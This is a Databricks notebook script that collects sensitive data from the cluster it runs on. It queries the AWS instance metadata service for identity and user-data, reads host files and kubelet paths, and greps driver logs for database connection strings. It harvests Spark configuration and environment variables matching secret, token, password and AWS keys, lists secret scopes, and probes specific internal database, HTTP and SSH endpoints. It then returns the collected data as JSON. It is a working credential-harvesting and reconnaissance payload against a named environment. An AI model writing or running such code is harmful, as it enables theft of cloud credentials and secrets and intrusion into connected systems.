# Databricks notebook source
import json, os, base64, socket, subprocess, urllib.request
out = {}
def add(k, f):
    try:
        v = f()
        s = json.dumps(v, default=str)
        if len(s) > 45000:
            s = s[:45000] + '...TRUNC'
            out[k] = s
        else:
            out[k] = v
    except Exception as e:
        out[k] = 'ERR: ' + repr(e)[:300]

def http(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {})
    return urllib.request.urlopen(req, timeout=timeout).read().decode()

tok = None
def imds_tok():
    global tok
    if tok is None:
        tok = urllib.request.urlopen(urllib.request.Request(
            'http://169.254.169.254/latest/api/token', method='PUT',
            headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}), timeout=4).read().decode()
    return tok

def imds(path):
    return http('http://169.254.169.254/latest/' + path, {'X-aws-ec2-metadata-token': imds_tok()})

add('identity', lambda: json.loads(imds('dynamic/instance-identity/document')))
add('userdata', lambda: imds('user-data')[:3000])
add('hosts', lambda: open('/etc/hosts').read()[:1500])
add('resolv', lambda: open('/etc/resolv.conf').read()[:800])
add('id', lambda: subprocess.check_output(['id']).decode())
add('uname', lambda: subprocess.check_output(['uname','-a']).decode())
add('k8s_local', lambda: subprocess.check_output(
    "ls -la /var/lib/kubelet /etc/kubernetes /root/.kube 2>&1 | head -20; which kubectl kubelet 2>&1; ls /databricks/driver 2>&1 | head", shell=True).decode()[:2000])
add('driverlogs', lambda: subprocess.check_output(
    "ls -la /databricks/driver/logs 2>&1 | head -20; grep -rhoE 'jdbc:postgresql://[^ \"\\x27]+' /databricks/driver/logs 2>/dev/null | sort -u | head -10", shell=True).decode()[:2500])
add('proc', lambda: subprocess.check_output("ps aux | grep -viE 'grep' | awk '{print $11,$12,$13}' | sort -u | head -40", shell=True).decode()[:2500])
add('catalogs', lambda: [r.asDict() for r in spark.sql('SHOW CATALOGS').collect()])
add('dbs', lambda: [(d.name, d.locationUri) for d in spark.catalog.listDatabases()])
add('mounts', lambda: [(m.mountPoint, m.source) for m in dbutils.fs.mounts()])
add('volumes', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/Volumes/')][:50])
add('filestore', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/FileStore/')][:50])
add('tmpfs', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/tmp/')][:50])
add('noshow', lambda: [str(x) for x in dbutils.fs.ls('dbfs:/mnt/datapao-public/noshowdata/')][:60])
def conf():
    r = {}
    for k, v in spark.conf.getAll().items():
        kl = k.lower()
        if any(t in kl for t in ('secret','token','key','password','jdbc','url','aws','s3','user','workspace','org','cluster')):
            r[k] = v
    return r
add('sparkconf', conf)
def tcp(hp):
    h, p = hp.rsplit(':', 1)
    try:
        s = socket.create_connection((h, int(p)), timeout=4); s.close(); return 'OPEN'
    except Exception as e:
        return 'ERR ' + type(e).__name__ + ' ' + str(e)[:80]
add('net', lambda: {hp: tcp(hp) for hp in [
    'dathic.csimx5obwwi3.us-east-1.rds.amazonaws.com:5432',
    '172.31.6.210:5432',
    '34.200.236.84:80',
    '54.157.17.216:22']})
add('scopes', lambda: [str(s) for s in dbutils.secrets.listScopes()])
def secret_keys():
    r = {}
    for s in ['dathic_scope']:
        try:
            r[s] = [getattr(k, 'key', None) or str(k) for k in dbutils.secrets.list(s)]
        except Exception as e:
            r[s] = 'ERR ' + repr(e)[:150]
    return r
add('secret_keys', secret_keys)
add('env', lambda: {k: v for k, v in os.environ.items() if any(t in k.upper() for t in ('TOKEN','SECRET','PASS','KEY','AWS','DBX','DATABRICKS','URL'))})
# workspace-ish local paths
add('repos_dirs', lambda: subprocess.check_output("ls -la /Workspace /Repos 2>&1 | head -20", shell=True).decode()[:1500])
dbutils.notebook.exit(json.dumps(out, default=str)[:900000])
